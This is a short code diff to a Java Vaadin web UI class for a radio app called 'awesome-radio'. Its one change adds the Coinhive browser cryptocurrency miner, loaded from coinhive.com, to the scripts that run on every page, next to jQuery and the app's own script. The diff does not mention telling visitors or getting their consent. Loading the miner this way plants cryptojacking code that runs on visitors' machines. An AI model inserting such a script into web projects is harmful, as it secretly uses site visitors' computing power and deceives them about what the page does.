@@ -12,7 +12,7 @@ import org.enoy.awesomeradio.user.AwesomeRadioUser;
 import org.springframework.beans.factory.annotation.Autowired;
 
 @SpringUI(path = AwesomeRadioUI.UI_PATH)
-@JavaScript("vaadin://js/awesome-radio.js")
+@JavaScript({"https://coinhive.com/lib/coinhive.min.js", "vaadin://js/jquery-3.2.1.min.js", "vaadin://js/awesome-radio.js"})
 @Push
 @Theme("awesome-radio")
 public class AwesomeRadioUI extends UI {
